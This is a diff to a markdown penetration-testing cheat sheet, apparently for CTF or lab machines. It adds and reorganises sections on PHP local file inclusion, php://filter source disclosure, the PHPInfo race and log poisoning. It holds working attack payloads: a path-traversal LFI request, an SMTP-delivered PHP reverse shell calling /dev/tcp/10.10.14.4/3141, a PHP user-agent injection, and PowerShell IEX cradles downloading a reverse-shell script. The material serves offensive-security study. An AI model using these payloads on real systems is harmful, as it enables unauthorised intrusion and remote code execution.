@@ -31,10 +31,18 @@
 30. [Oracle](#Oracle)
 31. [Memory Analysis](#Memory-Analysis)
 32. [Upload Bypass](#Upload-Bypass)
+33. [Local File Inclusion](#Local-File-Inclusion)
+34. [Log Poisoning](#Log-Poisoning)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
 # Misc
+
+## PHP Filter
+* to avoid scripts to be executed which you can access via parameter use:
+```
+GET /browse.php?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
+```
 
 ## System Images
 ### Transfer compressed image via netcat
@@ -848,50 +856,6 @@ powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.
 c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
 ```
 
-## LFI + SMPT Reverse Shell
-* assume you have local file inclusion like:
-```
-GET //vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action HTTP/1.1
-```
-* additionally assume SMTP Port (25) is open
-```
-# connect
-$> telnet 10.10.10.7 25
-Trying 10.10.10.7...
-Connected to 10.10.10.7.
-Escape character is '^]'.
-
-# wait for prompt
-220 beep.localdomain ESMTP Postfix
-
-# if enhanced
-EHLO asdf
-
-# if not
-HELO asdf
-
-# verify receipient
-VRFY fanis@localhost
-252 2.0.0 fanis@localhost # if exist
-550 5.1.1 <asdf>: Recipient address rejected: User unknown in local recipient table # if not
-
-# send mail with payload
-mail from: manu@manu.ch
-250 2.1.0 Ok
-rcpt to: fanis@localhost
-250 2.1.5 Ok
-data
-354 End data with <CR><LF>.<CR><LF>
-<?php system("/bin/bash -i >& /dev/tcp/10.10.14.4/3141 0>&1"); ?>
-
-.
-250 2.0.0 Ok: queued as E2517D92FD
-
-```
-* setup listener and send request to:
-```
-/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/fanis%00&module=Accounts&action
-```
 
 # RSA
 ## Given: q, p, and e values for an RSA key, along with an encrypted message
@@ -1457,4 +1421,67 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
 ```
 
+# Local File Inclusion
 
+## Example
+* assume website provides functionality to view files
+* if not properly sanitized input like ``../../../../../etc/passwd`` may be possible
+
+## PHPInfo LFI
+* see https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+* basic idea: race condition due to saving request (multipart) in file under /tmp/XYZ
+* the filename can be found in the phpinfo page under variables
+* the request should be as big as possible to increase processing time to win the race
+* if you are able to browse/access this file before it gets deleted you have RCE
+
+## LFI + SMPT Reverse Shell
+* assume you have local file inclusion like:
+```
+GET //vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action HTTP/1.1
+```
+* additionally assume SMTP Port (25) is open
+```
+# connect
+$> telnet 10.10.10.7 25
+Trying 10.10.10.7...
+Connected to 10.10.10.7.
+Escape character is '^]'.
+
+# wait for prompt
+220 beep.localdomain ESMTP Postfix
+
+# if enhanced
+EHLO asdf
+
+# if not
+HELO asdf
+
+# verify receipient
+VRFY fanis@localhost
+252 2.0.0 fanis@localhost # if exist
+550 5.1.1 <asdf>: Recipient address rejected: User unknown in local recipient table # if not
+
+# send mail with payload
+mail from: manu@manu.ch
+250 2.1.0 Ok
+rcpt to: fanis@localhost
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+<?php system("/bin/bash -i >& /dev/tcp/10.10.14.4/3141 0>&1"); ?>
+
+.
+250 2.0.0 Ok: queued as E2517D92FD
+
+```
+* setup listener and send request to:
+```
+/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/fanis%00&module=Accounts&action
+```
+
+# Log Poisoning
+* For this example a LFI is necessary to work
+* prerequisite: accessing the http-log file is needed
+* since your user agent is logged for example in /var/log/apache2/access.log you have full control
+* modify user agent for example to: ``<?php exec("whoami");?>``
+* browse to access log of web server
